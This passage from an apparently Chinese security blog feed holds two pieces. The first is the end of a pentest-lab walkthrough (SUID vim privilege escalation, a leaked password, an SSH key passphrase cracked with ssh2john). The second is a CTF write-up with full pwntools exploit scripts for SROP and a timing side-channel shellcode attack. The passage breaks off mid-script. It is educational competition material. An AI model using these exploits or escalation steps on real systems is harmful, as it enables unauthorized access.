src="/PenTest_FILE/2e63c698b3e72ead20ea064e3e854c09_MD5.jpeg"></li><li>我们能够查看&#x2F;etc&#x2F;passwd，不能查看&#x2F;etc&#x2F;shadow<br><img src="/PenTest_FILE/52d5c255a33912a47b2c412e028f5f34_MD5.jpeg"></li><li>可疑SUID文件：&#x2F;usr&#x2F;bin&#x2F;vim.basic<br><img src="/PenTest_FILE/22b9d80abc9dbe88ed0b2397407f2d08_MD5.jpeg"><br>我们可以直接利用vim.basic以root打开备份文件！</li></ul><p>得到这样一串密码：<code>heresareallystrongpasswordthatfollowsthepasswordpolicy$$</code></p><p>成功登录kay账户！<br><img src="/PenTest_FILE/01f50201c04dbb3801bcf7777e0f9cd5_MD5.jpeg"></p><h2 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h2><p>我们注意到&#x2F;home&#x2F;kay目录下有一个.ssh文件夹，其下存放着 kay 账户的ssh公钥和私钥<br><img src="/PenTest_FILE/c15c43b2aa1d36dd9e0029659aaa706d_MD5.jpeg"><br>将其复制到本地，chmod 600</p><p>尝试使用私钥来ssh连接kay账户，但不幸的是需要输入key passphrase：<br><img src="/PenTest_FILE/37b3160de56065110db9dc1095c21343_MD5.jpeg"></p><blockquote><p>密钥登录简单说是我们生成一个密钥对（公钥与私钥），接着我们把公钥放到目标服务器上，然后用密钥去登录目标服务器。<br>私钥的密码（passphrase）是我们在生成密钥对的时候有机会去设置，这个设置是可选项来着。一般基于安全考虑最好是设置，当给私钥设置了密码，然后用该私钥ssh到目标服务器时，终端会提示你输入私钥的密码。如果不想每次都输入私钥的密码，最简单是不用设置密码</p></blockquote><p><del>到这里卡住了，看wp是使用了ssh2john来进行爆破，等后面学到了再补叭</del></p><p>学成归来！用ssh2john转一下格式，尝试破解一下hash<br><img src="/PenTest_FILE/f7adbbfc9be7e5e209e25516fbb96513_MD5.jpeg"><br>破解成功！账户kay : beeswax</p><p><img src="/PenTest_FILE/de14e3900826f849c6702643eec06310_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 进攻性渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023-线上-第六届安洵杯</title>
      <link href="/2023/12/29/2023-%E7%BA%BF%E4%B8%8A-%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF/"/>
      <url>/2023/12/29/2023-%E7%BA%BF%E4%B8%8A-%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p>本次比赛排行第六<br><img src="/EXP_FILE/b99ab622882c34786e53bfba688023ea_MD5.jpeg"><br><img src="/EXP_FILE/29566ca0bd6298c9192873218fdc841d_MD5.jpeg"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="seccomp"><a href="#seccomp" class="headerlink" title="seccomp"></a>seccomp</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>没开pie和canary，开了沙箱<br><img src="/EXP_FILE/bcef12d16a369a7916a4adc7ddfbb399_MD5.png"><br><img src="/EXP_FILE/a9367d34ff663d00ebf7f0f3280d7b2c_MD5.png"></p><p>有一个溢出，溢出0x10，同时可以在bss输入0x1000的数据：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">sub_40136E</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> v1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+6h] [rbp-2Ah] BYREF</span>  _QWORD v2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h] BYREF</span>  v2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'onk u oD'</span><span class="token punctuation">;</span>  v2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'i tahw w'</span><span class="token punctuation">;</span>  v2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\n?DIUS s'</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token string">"easyhack\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token number">9LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// write(1,v1,0x9)</span>  <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_404060<span class="token punctuation">,</span> <span class="token number">0x1000LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// read(0, bss, 0x1000)</span>  <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> v2<span class="token punctuation">,</span> <span class="token number">0x18LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// write(1,v2,0x18)</span>  <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token number">0x3ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// read(0,v1,0x3a)</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>找到gadget，直接栈劫持到bss，打srop的orw链子<br><img src="/EXP_FILE/c5fe6f52e40a301e54a0cfa7eb2fec0f_MD5.png"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class="line-numbers language-python" data-language="python"><div class="caption"><span>TI:"自写exp"</span></div><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>syscall_p_ret<span class="token operator">=</span><span class="token number">0x000000000040118a</span>sigreturn_ret<span class="token operator">=</span><span class="token number">0x0000000000401194</span>leave_ret<span class="token operator">=</span><span class="token number">0x000000000040136c</span>bss<span class="token operator">=</span><span class="token number">0x0000000000404060</span><span class="token comment">#------------open</span>sigframe_open <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe_open<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">2</span>sigframe_open<span class="token punctuation">.</span>rdi <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x110</span> <span class="token comment">#flag_addr</span>sigframe_open<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>sigframe_open<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>sigframe_open<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x200</span><span class="token operator">-</span><span class="token number">8</span>sigframe_open<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_p_retpayload<span class="token operator">=</span>p64<span class="token punctuation">(</span>sigreturn_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall_p_ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>sigframe_open<span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">b'./flag\x00\x00'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token comment">#--------------read</span>sigframe_read <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe_read<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>sigframe_read<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">3</span>sigframe_read<span class="token punctuation">.</span>rsi <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x800</span>sigframe_read<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x100</span>sigframe_read<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x400</span><span class="token operator">-</span><span class="token number">8</span>sigframe_read<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_p_retpayload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>sigreturn_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall_p_ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>sigframe_read<span class="token punctuation">)</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token comment">#-------------write</span>sigframe_write <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe_write<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">1</span>sigframe_write<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">1</span>sigframe_write<span class="token punctuation">.</span>rsi <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x800</span>sigframe_write<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x100</span>sigframe_write<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x600</span><span class="token operator">-</span><span class="token number">8</span>sigframe_write<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_p_retpayload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>sigreturn_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall_p_ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>sigframe_write<span class="token punctuation">)</span><span class="token comment">#--------------------------</span>sa<span class="token punctuation">(</span><span class="token string">'easyhack\n'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x2a</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token comment">#dbg('b *0x40136d\nc\n')</span>sa<span class="token punctuation">(</span><span class="token string">'SUID?\n'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./chall'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>手快先交了</p></blockquote><h2 id="side-channel"><a href="#side-channel" class="headerlink" title="side_channel"></a>side_channel</h2><h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>跟上题几乎一模一样，不过禁用了write的系统调用，允许mprotect<br><img src="/EXP_FILE/5176030fd7a52aad5cb4772e0a96851d_MD5.jpeg"></p><p>采用侧信道攻击来爆破</p><blockquote><p>由于程序中的沙盒禁用了输出流，致使我们不能够直接获得flag的明文，这就是主信道获取信息的方式已经不能够被实现，然后我们使用flag中可能有的所有字符当作字典，逐位进行爆破，通过<strong>返回的不同信息来判断flag的明文。这就是侧信道攻击的思想</strong>。</p></blockquote><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>调用mprotect划bss为rwx权限，在上面布置shellcode</p><pre class="line-numbers language-python" data-language="python"><div class="caption"><span>TI:"自写exp"</span></div><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>ch<span class="token punctuation">)</span><span class="token punctuation">:</span>syscall_p_ret<span class="token operator">=</span><span class="token number">0x000000000040118a</span>sigreturn_ret<span class="token operator">=</span><span class="token number">0x0000000000401194</span>leave_ret<span class="token operator">=</span><span class="token number">0x000000000040136c</span>bss<span class="token operator">=</span><span class="token number">0x0000000000404060</span><span class="token comment">#------------open</span>sigframe_open <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe_open<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">2</span>sigframe_open<span class="token punctuation">.</span>rdi <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x110</span> <span class="token comment">#flag_addr</span>sigframe_open<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>sigframe_open<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>sigframe_open<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x200</span><span class="token operator">-</span><span class="token number">8</span>sigframe_open<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_p_retpayload<span class="token operator">=</span>p64<span class="token punctuation">(</span>sigreturn_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall_p_ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>sigframe_open<span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">b'./flag\x00\x00'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token comment">#--------------read</span>sigframe_read <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe_read<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>sigframe_read<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">3</span>sigframe_read<span class="token punctuation">.</span>rsi <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x800</span>sigframe_read<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x100</span>sigframe_read<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x400</span><span class="token operator">-</span><span class="token number">8</span>sigframe_read<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_p_retpayload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>sigreturn_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall_p_ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>sigframe_read<span class="token punctuation">)</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token comment">#-------------mprotect</span>sigframe_mprotect <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe_mprotect<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">10</span>sigframe_mprotect<span class="token punctuation">.</span>rdi <span class="token operator">=</span> bss<span class="token operator">&amp;</span><span class="token number">0xfffff000</span>sigframe_mprotect<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x1000</span>sigframe_mprotect<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">7</span>sigframe_mprotect<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x600</span><span class="token operator">-</span><span class="token number">8</span>sigframe_mprotect<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_p_retpayload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>sigreturn_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall_p_ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>sigframe_mprotect<span class="token punctuation">)</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x600</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token comment">#------------shellcode</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x600</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment">#shellcode_addr</span>shellcode<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'''mov rsi, 0x404860'''</span></span><span class="token keyword">if</span> idx <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>shellcode <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f'''cmp byte ptr[rsi+</span><span class="token interpolation"><span class="token punctuation">&#123;</span>idx<span class="token punctuation">&#125;</span></span><span class="token string">], </span><span class="token interpolation"><span class="token punctuation">&#123;</span>ch<span class="token punctuation">&#125;</span></span><span class="token string">jz $-3mov al,0x3csyscall'''</span></span><span class="token keyword">else</span><span class="token punctuation">:</span>shellcode <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f'''cmp byte ptr[rsi+</span><span class="token interpolation"><span class="token punctuation">&#123;</span>idx<span class="token punctuation">&#125;</span></span><span class="token string">], </span><span class="token interpolation"><span class="token punctuation">&#123;</span>ch<span class="token punctuation">&#125;</span></span><span class="token string">jz $-4ret'''</span></span><span class="token comment">#--------------------------</span>payload<span class="token operator">+=</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'easyhack\n'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x2a</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token comment">#dbg('b *0x404668\nc\n')</span>sa<span class="token punctuation">(</span><span class="token string">'SUID?\n'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span><span class="token keyword">pass</span>end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>end <span class="token operator">-</span> start <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'found: '</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> ch<span class="token keyword">else</span><span class="token punctuation">:</span>log<span class="token punctuation">.</span>failure<span class="token punctuation">(</span><span class="token string">'not found'</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">None</span><span class="token comment">#itr()</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal=["tmux","splitw","-h"]</span>binary<span class="token operator">=</span><span class="token string">'./chall'</span><span class="token comment">#context.log_level='debug'</span>elf<span class="token operator">=</span>ELF<span class="token 